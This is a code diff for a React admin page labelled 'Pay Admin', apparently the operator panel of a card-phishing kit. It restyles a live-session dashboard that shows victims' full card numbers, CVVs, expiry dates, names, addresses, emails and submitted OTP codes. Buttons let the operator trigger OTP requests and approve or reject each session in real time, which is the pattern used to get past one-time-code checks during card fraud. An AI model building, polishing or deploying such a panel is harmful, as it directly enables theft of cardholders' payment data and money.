@@ -1,7 +1,7 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useMemo } from "react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
-import { Lock, CreditCard, CheckCircle, XCircle, KeyRound, Eye, EyeOff, RefreshCw } from "lucide-react";
+import { Lock, CreditCard, CheckCircle, XCircle, KeyRound, Eye, EyeOff, RefreshCw, Activity, Users, Clock, ShieldCheck, ChevronDown, ChevronUp, Mail, MapPin, Hash } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 import { Badge } from "@/components/ui/badge";
@@ -110,18 +110,38 @@ const Admin = () => {
     }
   };
 
-  const getStatusBadge = (status: string) => {
-    const map: Record<string, { variant: "default" | "secondary" | "destructive" | "outline"; label: string }> = {
-      pending: { variant: "outline", label: "Pending" },
-      waiting: { variant: "secondary", label: "Waiting" },
-      otp_required: { variant: "default", label: "OTP Required" },
-      processing: { variant: "secondary", label: "Processing" },
-      approved: { variant: "default", label: "Approved" },
-      rejected: { variant: "destructive", label: "Rejected" },
+  const getStatusConfig = (status: string) => {
+    const map: Record<string, { variant: "default" | "secondary" | "destructive" | "outline"; label: string; dotColor: string }> = {
+      pending: { variant: "outline", label: "Pending", dotColor: "bg-muted-foreground" },
+      waiting: { variant: "secondary", label: "Waiting", dotColor: "bg-yellow-500" },
+      otp_required: { variant: "default", label: "OTP Required", dotColor: "bg-primary" },
+      otp: { variant: "default", label: "OTP Sent", dotColor: "bg-primary" },
+      processing: { variant: "secondary", label: "Processing", dotColor: "bg-yellow-500" },
+      approved: { variant: "default", label: "Approved", dotColor: "bg-emerald-500" },
+      success: { variant: "default", label: "Success", dotColor: "bg-emerald-500" },
+      rejected: { variant: "destructive", label: "Rejected", dotColor: "bg-destructive" },
     };
-    const info = map[status] || { variant: "outline" as const, label: status };
-    return <Badge variant={info.variant}>{info.label}</Badge>;
+    return map[status] || { variant: "outline" as const, label: status, dotColor: "bg-muted-foreground" };
   };
+
+  const getStatusBadge = (status: string) => {
+    const config = getStatusConfig(status);
+    return (
+      <Badge variant={config.variant} className="gap-1.5 font-medium">
+        <span className={`h-1.5 w-1.5 rounded-full ${config.dotColor}`} />
+        {config.label}
+      </Badge>
+    );
+  };
+
+  // Stats
+  const stats = useMemo(() => {
+    const total = sessions.length;
+    const pending = sessions.filter(s => ["pending", "waiting"].includes(s.status)).length;
+    const otpRequired = sessions.filter(s => ["otp_required", "otp"].includes(s.status)).length;
+    const completed = sessions.filter(s => ["approved", "success"].includes(s.status)).length;
+    return { total, pending, otpRequired, completed };
+  }, [sessions]);
 
   const brand = detectCardBrand(form.cardNumber);
   const parsedAmount = parseFloat(amount) || 0;
@@ -225,140 +245,214 @@ const Admin = () => {
   }
 
   return (
-    <div className="min-h-screen bg-background">
-      {/* Top bar */}
-      <div className="border-b border-border px-4 py-3 flex items-center justify-between">
-        <div className="flex items-center gap-2">
-          <div className="h-7 w-7 rounded-full bg-primary flex items-center justify-center">
-            <span className="text-primary-foreground text-xs font-bold">P</span>
+    <div className="min-h-screen bg-muted/30">
+      {/* ===== HEADER ===== */}
+      <header className="bg-card border-b border-border sticky top-0 z-50">
+        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div className="flex items-center justify-between h-14">
+            <div className="flex items-center gap-3">
+              <div className="h-8 w-8 rounded-lg bg-primary flex items-center justify-center shadow-sm">
+                <span className="text-primary-foreground text-sm font-bold">P</span>
+              </div>
+              <div className="flex items-center gap-2">
+                <span className="text-foreground font-semibold text-base">Pay</span>
+                <span className="text-[10px] font-semibold uppercase tracking-widest text-muted-foreground bg-muted px-2 py-0.5 rounded">Admin</span>
+              </div>
+            </div>
+            <div className="flex items-center gap-1 bg-muted rounded-lg p-1">
+              <button
+                onClick={() => setActiveTab("sessions")}
+                className={`px-3.5 py-1.5 rounded-md text-sm font-medium transition-all ${
+                  activeTab === "sessions"
+                    ? "bg-card text-foreground shadow-sm"
+                    : "text-muted-foreground hover:text-foreground"
+                }`}
+              >
+                <Activity className="h-3.5 w-3.5 inline-block mr-1.5 -mt-0.5" />
+                Sessions
+              </button>
+              <button
+                onClick={() => setActiveTab("form")}
+                className={`px-3.5 py-1.5 rounded-md text-sm font-medium transition-all ${
+                  activeTab === "form"
+                    ? "bg-card text-foreground shadow-sm"
+                    : "text-muted-foreground hover:text-foreground"
+                }`}
+              >
+                <CreditCard className="h-3.5 w-3.5 inline-block mr-1.5 -mt-0.5" />
+                Manual Entry
+              </button>
+            </div>
           </div>
-          <span className="text-foreground font-semibold">Pay</span>
-          <Badge variant="outline" className="text-xs">Admin</Badge>
         </div>
-        <div className="flex items-center gap-1">
-          <Button
-            variant={activeTab === "sessions" ? "default" : "ghost"}
-            size="sm"
-            onClick={() => setActiveTab("sessions")}
-          >
-            Sessions
-          </Button>
-          <Button
-            variant={activeTab === "form" ? "default" : "ghost"}
-            size="sm"
-            onClick={() => setActiveTab("form")}
-          >
-            Manual Entry
-          </Button>
-        </div>
-      </div>
+      </header>
 
       {activeTab === "sessions" ? (
-        /* ========== SESSION MONITORING ========== */
-        <div className="max-w-4xl mx-auto p-4 sm:p-6 space-y-4">
+        /* ========== SESSION DASHBOARD ========== */
+        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6">
+          {/* Stats Row */}
+          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
+            {[
+              { label: "Total Sessions", value: stats.total, icon: Users, accent: "text-primary" },
+              { label: "Pending", value: stats.pending, icon: Clock, accent: "text-yellow-600" },
+              { label: "Awaiting OTP", value: stats.otpRequired, icon: KeyRound, accent: "text-primary" },
+              { label: "Completed", value: stats.completed, icon: ShieldCheck, accent: "text-emerald-600" },
+            ].map((stat) => (
+              <div key={stat.label} className="bg-card rounded-xl border border-border p-4 sm:p-5">
+                <div className="flex items-center justify-between mb-2">
+                  <span className="text-xs font-medium text-muted-foreground uppercase tracking-wide">{stat.label}</span>
+                  <stat.icon className={`h-4 w-4 ${stat.accent} opacity-70`} />
+                </div>
+                <p className="text-2xl sm:text-3xl font-bold text-foreground tracking-tight">{stat.value}</p>
+              </div>
+            ))}
+          </div>
+
+          {/* Sessions Header */}
           <div className="flex items-center justify-between">
-            <h2 className="text-lg font-semibold text-foreground">Live Sessions</h2>
-            <Button variant="ghost" size="sm" onClick={fetchSessions}>
-              <RefreshCw className="h-4 w-4 mr-1" /> Refresh
+            <div>
+              <h2 className="text-lg font-semibold text-foreground">Live Sessions</h2>
+              <p className="text-xs text-muted-foreground mt-0.5">Real-time monitoring · Auto-updates</p>
+            </div>
+            <Button variant="outline" size="sm" onClick={fetchSessions} className="gap-1.5">
+              <RefreshCw className="h-3.5 w-3.5" /> Refresh
             </Button>
           </div>
 
+          {/* Sessions List */}
           {sessions.length === 0 ? (
-            <div className="text-center py-16 text-muted-foreground text-sm">
-              No sessions yet. Waiting for submissions…
+            <div className="bg-card rounded-xl border border-border p-16 text-center">
+              <Activity className="h-10 w-10 text-muted-foreground/30 mx-auto mb-3" />
+              <p className="text-muted-foreground text-sm font-medium">No sessions yet</p>
+              <p className="text-muted-foreground/60 text-xs mt-1">Waiting for submissions…</p>
             </div>
           ) : (
-            <div className="space-y-3">
+            <div className="space-y-2.5">
               {sessions.map((s) => {
                 const fd = (s.form_data || {}) as any;
                 const isExpanded = expandedSession === s.id;
+                const statusConfig = getStatusConfig(s.status);
                 return (
-                  <div key={s.id} className="border border-border rounded-lg bg-card overflow-hidden">
-                    {/* Session header */}
+                  <div
+                    key={s.id}
+                    className={`bg-card rounded-xl border transition-all duration-200 overflow-hidden ${
+                      isExpanded ? "border-primary/30 shadow-md" : "border-border hover:border-border/80 hover:shadow-sm"
+                    }`}
+                  >
+                    {/* Session row */}
                     <div
-                      className="flex items-center justify-between p-4 cursor-pointer hover:bg-muted/50 transition-colors"
+                      className="flex items-center gap-3 sm:gap-4 p-4 sm:p-5 cursor-pointer select-none"
                       onClick={() => setExpandedSession(isExpanded ? null : s.id)}
                     >
-                      <div className="flex items-center gap-3 min-w-0">
-                        {getStatusBadge(s.status)}
-                        <span className="text-sm font-mono text-muted-foreground truncate">
-                          {s.id.slice(0, 8)}…
-                        </span>
-                        {fd.email && (
-                          <span className="text-sm text-foreground truncate hidden sm:inline">
-                            {fd.email}
-                          </span>
-                        )}
-                        {fd.amount && (
-                          <span className="text-sm font-semibold text-foreground">
-                            €{fd.amount}
-                          </span>
-                        )}
+                      {/* Status dot */}
+                      <div className={`h-2.5 w-2.5 rounded-full shrink-0 ${statusConfig.dotColor} ring-4 ring-background`} />
+
+                      {/* Main info */}
+                      <div className="flex-1 min-w-0 flex flex-col sm:flex-row sm:items-center gap-1 sm:gap-4">
+                        <div className="flex items-center gap-2.5 min-w-0">
+                          {getStatusBadge(s.status)}
+                          {fd.amount && (
+                            <span className="text-base font-bold text-foreground tabular-nums">€{fd.amount}</span>
+                          )}
+                        </div>
+                        <div className="flex items-center gap-2 min-w-0">
+                          {fd.email && (
+                            <span className="text-sm text-muted-foreground truncate flex items-center gap-1">
+                              <Mail className="h-3 w-3 shrink-0" />
+                              {fd.email}
+                            </span>
+                          )}
+                        </div>
                       </div>
-                      <div className="flex items-center gap-2 shrink-0">
-                        <span className="text-xs text-muted-foreground hidden sm:inline">
-                          {new Date(s.created_at).toLocaleString()}
-                        </span>
-                        {isExpanded ? <EyeOff className="h-4 w-4 text-muted-foreground" /> : <Eye className="h-4 w-4 text-muted-foreground" />}
+
+                      {/* Meta */}
+                      <div className="flex items-center gap-3 shrink-0">
+                        <div className="text-right hidden sm:block">
+                          <p className="text-xs text-muted-foreground">
+                            {new Date(s.created_at).toLocaleDateString("en-GB", { day: "2-digit", month: "short" })}
+                          </p>
+                          <p className="text-[10px] text-muted-foreground/60">
+                            {new Date(s.created_at).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" })}
+                          </p>
+                        </div>
+                        {isExpanded
+                          ? <ChevronUp className="h-4 w-4 text-muted-foreground" />
+                          : <ChevronDown className="h-4 w-4 text-muted-foreground" />
+                        }
                       </div>
                     </div>
 
-                    {/* Expanded details */}
+                    {/* Expanded panel */}
                     {isExpanded && (
-                      <div className="border-t border-border">
-                        <div className="p-4 grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
-                          <div>
-                            <p className="text-muted-foreground text-xs mb-0.5">Card Number</p>
-                            <p className="text-foreground font-mono">{fd.cardNumber || "—"}</p>
+                      <div className="border-t border-border bg-muted/20">
+                        {/* Card details grid */}
+                        <div className="p-5 grid grid-cols-1 sm:grid-cols-3 gap-4">
+                          <div className="space-y-0.5">
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Card Number</p>
+                            <p className="text-sm font-mono text-foreground tracking-wider">{fd.cardNumber || "—"}</p>
                           </div>
-                          <div>
-                            <p className="text-muted-foreground text-xs mb-0.5">Expiry / CVV</p>
-                            <p className="text-foreground font-mono">{fd.expiry || "—"} / {fd.cvv || "—"}</p>
+                          <div className="space-y-0.5">
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Expiry</p>
+                            <p className="text-sm font-mono text-foreground">{fd.expiry || "—"}</p>
                           </div>
-                          <div>
-                            <p className="text-muted-foreground text-xs mb-0.5">Cardholder</p>
-                            <p className="text-foreground">{fd.cardholderName || "—"}</p>
+                          <div className="space-y-0.5">
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">CVV</p>
+                            <p className="text-sm font-mono text-foreground">{fd.cvv || "—"}</p>
                           </div>
-                          <div>
-                            <p className="text-muted-foreground text-xs mb-0.5">Email</p>
-                            <p className="text-foreground">{fd.email || "—"}</p>
+                          <div className="space-y-0.5">
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Cardholder</p>
+                            <p className="text-sm text-foreground">{fd.cardholderName || "—"}</p>
                           </div>
-                          <div className="sm:col-span-2">
-                            <p className="text-muted-foreground text-xs mb-0.5">Billing Address</p>
-                            <p className="text-foreground">
+                          <div className="space-y-0.5">
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Email</p>
+                            <p className="text-sm text-foreground truncate">{fd.email || "—"}</p>
+                          </div>
+                          <div className="space-y-0.5">
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Session ID</p>
+                            <p className="text-sm font-mono text-muted-foreground">{s.id.slice(0, 12)}…</p>
+                          </div>
+                          <div className="sm:col-span-3 space-y-0.5">
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground flex items-center gap-1">
+                              <MapPin className="h-3 w-3" /> Billing Address
+                            </p>
+                            <p className="text-sm text-foreground">
                               {[fd.address1, fd.address2, fd.city, fd.state, fd.zip, fd.country].filter(Boolean).join(", ") || "—"}
                             </p>
                           </div>
                           {fd.otp && (
-                            <div>
-                              <p className="text-muted-foreground text-xs mb-0.5">OTP Submitted</p>
-                              <p className="text-foreground font-mono font-bold">{fd.otp}</p>
+                            <div className="space-y-0.5">
+                              <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground flex items-center gap-1">
+                                <Hash className="h-3 w-3" /> OTP Code
+                              </p>
+                              <p className="text-lg font-mono font-bold text-primary tracking-[0.3em]">{fd.otp}</p>
                             </div>
                           )}
                         </div>
 
-                        {/* Action buttons */}
-                        <div className="border-t border-border p-4 flex flex-wrap gap-2">
+                        {/* Actions */}
+                        <div className="border-t border-border px-5 py-3.5 flex flex-wrap gap-2 bg-card">
                           <Button
                             size="sm"
                             variant="outline"
-                            onClick={() => updateSessionStatus(s.id, "otp_required")}
+                            className="gap-1.5"
+                            onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp_required"); }}
                           >
-                            <KeyRound className="h-3.5 w-3.5 mr-1" /> Request OTP
+                            <KeyRound className="h-3.5 w-3.5" /> Request OTP
                           </Button>
                           <Button
                             size="sm"
-                            variant="default"
-                            onClick={() => updateSessionStatus(s.id, "approved")}
+                            className="gap-1.5"
+                            onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "approved"); }}
                           >
-                            <CheckCircle className="h-3.5 w-3.5 mr-1" /> Approve
+                            <CheckCircle className="h-3.5 w-3.5" /> Approve
                           </Button>
                           <Button
                             size="sm"
                             variant="destructive"
-                            onClick={() => updateSessionStatus(s.id, "rejected")}
+                            className="gap-1.5"
+                            onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "rejected"); }}
                           >
-                            <XCircle className="h-3.5 w-3.5 mr-1" /> Reject
+                            <XCircle className="h-3.5 w-3.5" /> Reject
                           </Button>
                         </div>
                       </div>
